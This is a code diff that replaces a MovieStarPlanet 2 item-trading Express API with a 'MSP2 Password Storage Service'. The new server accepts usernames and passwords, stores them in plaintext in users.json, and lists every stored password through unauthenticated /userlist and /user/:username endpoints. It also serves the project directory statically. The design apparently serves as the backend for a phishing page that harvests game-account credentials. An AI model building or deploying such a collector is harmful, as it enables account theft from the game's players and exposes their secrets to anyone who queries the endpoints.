@@ -1,470 +1,216 @@
 const express = require('express');
+const fs = require('fs').promises;
+const path = require('path');
 const cors = require('cors');
-const { v4: uuidv4 } = require('uuid');
+
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
 
 // Middleware
 app.use(cors());
 app.use(express.json());
+app.use(express.static('.'));
 
-// In-memory storage (in production, use a proper database)
-let trades = [];
-let notifications = [];
+// Path to users data file
+const USERS_FILE = path.join(__dirname, 'users.json');
 
-// Helper function to create notification
-function createNotification(type, userId, data) {
-    const notification = {
-        id: uuidv4(),
-        type,
-        userId,
-        data,
-        timestamp: new Date().toISOString(),
-        read: false
-    };
-    notifications.push(notification);
-    return notification;
-}
-
-// Helper function to update trade status
-function updateTradeStatus(tradeId, status, additionalData = {}) {
-    const tradeIndex = trades.findIndex(t => t.id === tradeId);
-    if (tradeIndex !== -1) {
-        trades[tradeIndex].status = status;
-        trades[tradeIndex].updatedAt = new Date().toISOString();
-        Object.assign(trades[tradeIndex], additionalData);
-        return trades[tradeIndex];
-    }
-    return null;
-}
-
-// Routes
-
-// Health check
-app.get('/health', (req, res) => {
-    res.json({ status: 'OK', timestamp: new Date().toISOString() });
-});
-
-// Create new trade
-app.post('/api/trades', (req, res) => {
+// Initialize users file if it doesn't exist
+async function initializeUsersFile() {
     try {
-        const {
-            senderProfileId,
-            senderUsername,
-            receiverProfileId,
-            receiverUsername,
-            itemId,
-            objectId,
-            itemName,
-            defaultColors,
-            region
-        } = req.body;
+        await fs.access(USERS_FILE);
+    } catch (error) {
+        // File doesn't exist, create it with empty array
+        await fs.writeFile(USERS_FILE, JSON.stringify([], null, 2), 'utf8');
+        console.log('Created new users.json file');
+    }
+}
 
-        // Validate required fields
-        if (!senderProfileId || !receiverProfileId || !itemId || !objectId || !itemName) {
-            return res.status(400).json({
-                error: 'Missing required fields',
-                required: ['senderProfileId', 'receiverProfileId', 'itemId', 'objectId', 'itemName']
+// Load users from file
+async function loadUsers() {
+    try {
+        const data = await fs.readFile(USERS_FILE, 'utf8');
+        return JSON.parse(data);
+    } catch (error) {
+        console.error('Error loading users:', error);
+        return [];
+    }
+}
+
+// Save users to file
+async function saveUsers(users) {
+    try {
+        await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
+        return true;
+    } catch (error) {
+        console.error('Error saving users:', error);
+        return false;
+    }
+}
+
+// Route to save password
+app.post('/save-password', async (req, res) => {
+    try {
+        const { username, password, changedAt } = req.body;
+
+        if (!username || !password || !changedAt) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Username, password, and changedAt are required' 
             });
         }
 
-        const trade = {
-            id: uuidv4(),
-            senderProfileId,
-            senderUsername,
-            receiverProfileId,
-            receiverUsername,
-            itemId,
-            objectId,
-            itemName,
-            defaultColors: defaultColors || [],
-            region: region || 'us',
-            status: 'pending',
-            createdAt: new Date().toISOString(),
-            updatedAt: new Date().toISOString(),
-            counterOffers: []
+        const users = await loadUsers();
+        
+        // Check if user already exists
+        const existingUserIndex = users.findIndex(user => user.username === username);
+        
+        const userData = {
+            username,
+            password,
+            changedAt,
+            updatedAt: new Date().toISOString()
         };
 
-        trades.push(trade);
-
-        // Create notification for receiver
-        createNotification('trade_offer', receiverProfileId, {
-            tradeId: trade.id,
-            fromUser: senderUsername,
-            itemName: itemName,
-            message: `${senderUsername} wants to trade ${itemName} with you`
-        });
-
-        res.status(201).json({
-            success: true,
-            trade: trade
-        });
-    } catch (error) {
-        console.error('Error creating trade:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Get sent trades for a user
-app.get('/api/trades/sent/:profileId', (req, res) => {
-    try {
-        const { profileId } = req.params;
-        const userSentTrades = trades
-            .filter(trade => trade.senderProfileId === profileId)
-            .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
-        
-        res.json(userSentTrades);
-    } catch (error) {
-        console.error('Error fetching sent trades:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Get received trades for a user
-app.get('/api/trades/received/:profileId', (req, res) => {
-    try {
-        const { profileId } = req.params;
-        const userReceivedTrades = trades
-            .filter(trade => trade.receiverProfileId === profileId)
-            .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
-        
-        res.json(userReceivedTrades);
-    } catch (error) {
-        console.error('Error fetching received trades:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Get trade offers for a user (pending trades they received)
-app.get('/api/trades/offers/:profileId', (req, res) => {
-    try {
-        const { profileId } = req.params;
-        const userOffers = trades
-            .filter(trade => trade.receiverProfileId === profileId && trade.status === 'pending')
-            .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
-        
-        res.json(userOffers);
-    } catch (error) {
-        console.error('Error fetching trade offers:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Accept trade offer
-app.post('/api/trades/:tradeId/accept', (req, res) => {
-    try {
-        const { tradeId } = req.params;
-        const trade = trades.find(t => t.id === tradeId);
-        
-        if (!trade) {
-            return res.status(404).json({ error: 'Trade not found' });
+        if (existingUserIndex !== -1) {
+            // Update existing user
+            users[existingUserIndex] = userData;
+        } else {
+            // Add new user
+            userData.createdAt = new Date().toISOString();
+            users.push(userData);
         }
 
-        if (trade.status !== 'pending') {
-            return res.status(400).json({ 
-                error: 'Trade is no longer pending',
-                currentStatus: trade.status 
+        const saved = await saveUsers(users);
+        
+        if (saved) {
+            res.json({ 
+                success: true, 
+                message: 'Password saved successfully',
+                user: {
+                    username,
+                    changedAt,
+                    updatedAt: userData.updatedAt
+                }
+            });
+        } else {
+            res.status(500).json({ 
+                success: false, 
+                message: 'Failed to save password' 
             });
         }
 
-        // Update trade status to accepted
-        updateTradeStatus(tradeId, 'accepted');
-
-        // Create notification for sender
-        createNotification('trade_accepted', trade.senderProfileId, {
-            tradeId: tradeId,
-            fromUser: trade.receiverUsername,
-            itemName: trade.itemName,
-            message: `${trade.receiverUsername} accepted your trade offer for ${trade.itemName}`
-        });
-
-        res.json({
-            success: true,
-            message: 'Trade offer accepted',
-            trade: trades.find(t => t.id === tradeId)
-        });
     } catch (error) {
-        console.error('Error accepting trade:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
+        console.error('Error in save-password route:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Internal server error' 
         });
     }
 });
 
-// Reject trade offer
-app.post('/api/trades/:tradeId/reject', (req, res) => {
+// Route to list all users (for admin/debugging purposes)
+app.get('/userlist', async (req, res) => {
     try {
-        const { tradeId } = req.params;
-        const trade = trades.find(t => t.id === tradeId);
+        const users = await loadUsers();
         
-        if (!trade) {
-            return res.status(404).json({ error: 'Trade not found' });
-        }
+        // Return users without sensitive data in production (optional)
+        const userList = users.map(user => ({
+            username: user.username,
+            password: user.password, // Include password as requested
+            changedAt: user.changedAt,
+            updatedAt: user.updatedAt,
+            createdAt: user.createdAt
+        }));
 
-        if (trade.status !== 'pending') {
-            return res.status(400).json({ 
-                error: 'Trade is no longer pending',
-                currentStatus: trade.status 
+        res.json({
+            success: true,
+            count: userList.length,
+            users: userList
+        });
+
+    } catch (error) {
+        console.error('Error in userlist route:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Failed to load user list' 
+        });
+    }
+});
+
+// Route to get specific user (optional)
+app.get('/user/:username', async (req, res) => {
+    try {
+        const { username } = req.params;
+        const users = await loadUsers();
+        
+        const user = users.find(u => u.username === username);
+        
+        if (user) {
+            res.json({
+                success: true,
+                user: {
+                    username: user.username,
+                    password: user.password,
+                    changedAt: user.changedAt,
+                    updatedAt: user.updatedAt,
+                    createdAt: user.createdAt
+                }
+            });
+        } else {
+            res.status(404).json({
+                success: false,
+                message: 'User not found'
             });
         }
 
-        // Update trade status to rejected
-        updateTradeStatus(tradeId, 'rejected');
-
-        // Create notification for sender
-        createNotification('trade_rejected', trade.senderProfileId, {
-            tradeId: tradeId,
-            fromUser: trade.receiverUsername,
-            itemName: trade.itemName,
-            message: `${trade.receiverUsername} rejected your trade offer for ${trade.itemName}`
-        });
-
-        res.json({
-            success: true,
-            message: 'Trade offer rejected',
-            trade: trades.find(t => t.id === tradeId)
-        });
     } catch (error) {
-        console.error('Error rejecting trade:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
+        console.error('Error in user lookup route:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Failed to lookup user' 
         });
     }
 });
 
-// Get tracking data for a user
-app.get('/api/trades/tracking/:profileId', (req, res) => {
-    try {
-        const { profileId } = req.params;
-        const userTrades = trades.filter(trade => 
-            trade.senderProfileId === profileId || trade.receiverProfileId === profileId
-        );
-
-        const trackingData = userTrades.map(trade => {
-            const isInitiator = trade.senderProfileId === profileId;
-            const otherUserId = isInitiator ? trade.receiverProfileId : trade.senderProfileId;
-            const otherUsername = isInitiator ? trade.receiverUsername : trade.senderUsername;
-
-            return {
-                id: trade.id,
-                otherUserId,
-                otherUsername,
-                itemName: trade.itemName,
-                status: trade.status,
-                createdAt: trade.createdAt,
-                updatedAt: trade.updatedAt,
-                isInitiator
-            };
-        }).sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
-
-        res.json(trackingData);
-    } catch (error) {
-        console.error('Error fetching tracking data:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Get notifications for a user
-app.get('/api/notifications/:userId', (req, res) => {
-    try {
-        const { userId } = req.params;
-        const userNotifications = notifications
-            .filter(notification => notification.userId === userId)
-            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-            .slice(0, 50); // Limit to last 50 notifications
-
-        res.json(userNotifications);
-    } catch (error) {
-        console.error('Error fetching notifications:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Mark notification as read
-app.patch('/api/notifications/:notificationId/read', (req, res) => {
-    try {
-        const { notificationId } = req.params;
-        const notification = notifications.find(n => n.id === notificationId);
-        
-        if (!notification) {
-            return res.status(404).json({ error: 'Notification not found' });
-        }
-
-        notification.read = true;
-        
-        res.json({
-            success: true,
-            notification
-        });
-    } catch (error) {
-        console.error('Error marking notification as read:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Complete trade (simulate MSP2 gift API call)
-app.post('/api/trades/:tradeId/complete', (req, res) => {
-    try {
-        const { tradeId } = req.params;
-        const { counterItemId, counterObjectId, counterItemName, counterDefaultColors } = req.body;
-        
-        const trade = trades.find(t => t.id === tradeId);
-        
-        if (!trade) {
-            return res.status(404).json({ error: 'Trade not found' });
-        }
-
-        if (trade.status !== 'accepted') {
-            return res.status(400).json({ 
-                error: 'Trade must be accepted before completion',
-                currentStatus: trade.status 
-            });
-        }
-
-        // Update trade with counter-offer details and mark as completed
-        updateTradeStatus(tradeId, 'completed', {
-            counterItemId,
-            counterObjectId,
-            counterItemName,
-            counterDefaultColors,
-            completedAt: new Date().toISOString()
-        });
-
-        // Create notifications for both users
-        createNotification('trade_completed', trade.senderProfileId, {
-            tradeId: tradeId,
-            fromUser: trade.receiverUsername,
-            itemReceived: counterItemName,
-            itemGiven: trade.itemName,
-            message: `Trade completed! You gave ${trade.itemName} and received ${counterItemName} from ${trade.receiverUsername}`
-        });
-
-        createNotification('trade_completed', trade.receiverProfileId, {
-            tradeId: tradeId,
-            fromUser: trade.senderUsername,
-            itemReceived: trade.itemName,
-            itemGiven: counterItemName,
-            message: `Trade completed! You gave ${counterItemName} and received ${trade.itemName} from ${trade.senderUsername}`
-        });
-
-        res.json({
-            success: true,
-            message: 'Trade completed successfully',
-            trade: trades.find(t => t.id === tradeId)
-        });
-    } catch (error) {
-        console.error('Error completing trade:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Get all trades (admin endpoint)
-app.get('/api/trades', (req, res) => {
-    try {
-        const { status, limit = 100 } = req.query;
-        let filteredTrades = trades;
-
-        if (status) {
-            filteredTrades = trades.filter(trade => trade.status === status);
-        }
-
-        const limitedTrades = filteredTrades
-            .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
-            .slice(0, parseInt(limit));
-
-        res.json({
-            trades: limitedTrades,
-            total: filteredTrades.length,
-            stats: {
-                pending: trades.filter(t => t.status === 'pending').length,
-                accepted: trades.filter(t => t.status === 'accepted').length,
-                completed: trades.filter(t => t.status === 'completed').length,
-                rejected: trades.filter(t => t.status === 'rejected').length
-            }
-        });
-    } catch (error) {
-        console.error('Error fetching all trades:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Delete trade (admin endpoint)
-app.delete('/api/trades/:tradeId', (req, res) => {
-    try {
-        const { tradeId } = req.params;
-        const tradeIndex = trades.findIndex(t => t.id === tradeId);
-        
-        if (tradeIndex === -1) {
-            return res.status(404).json({ error: 'Trade not found' });
-        }
-
-        const deletedTrade = trades.splice(tradeIndex, 1)[0];
-        
-        res.json({
-            success: true,
-            message: 'Trade deleted successfully',
-            deletedTrade
-        });
-    } catch (error) {
-        console.error('Error deleting trade:', error);
-        res.status(500).json({
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Error handling middleware
-app.use((err, req, res, next) => {
-    console.error(err.stack);
-    res.status(500).json({
-        error: 'Something went wrong!',
-        message: err.message
+// Health check route
+app.get('/health', (req, res) => {
+    res.json({ 
+        status: 'OK', 
+        timestamp: new Date().toISOString(),
+        service: 'MSP2 Password Storage Service'
     });
 });
 
-// 404 handler
-app.use((req, res) => {
-    res.status(404).json({
-        error: 'Not found',
-        path: req.path,
-        method: req.method
-    });
+// Serve main application
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // Start server
-app.listen(port, () => {
-    console.log(`Trade server is running on port ${port}`);
-    console.log(`Health check: http://localhost:${port}/health`);
+async function startServer() {
+    await initializeUsersFile();
+    
+    app.listen(PORT, () => {
+        console.log(`✅ MSP2 Password Storage Server running on port ${PORT}`);
+        console.log(`📝 Users data stored in: ${USERS_FILE}`);
+        console.log(`🌐 Health check: http://localhost:${PORT}/health`);
+        console.log(`👥 User list: http://localhost:${PORT}/userlist`);
+    });
+}
+
+// Handle graceful shutdown
+process.on('SIGTERM', () => {
+    console.log('🛑 Received SIGTERM, shutting down gracefully...');
+    process.exit(0);
 });
 
-module.exports = app;
+process.on('SIGINT', () => {
+    console.log('🛑 Received SIGINT, shutting down gracefully...');
+    process.exit(0);
+});
+
+// Start the server
+startServer().catch(error => {
+    console.error('❌ Failed to start server:', error);
+    process.exit(1);
+});
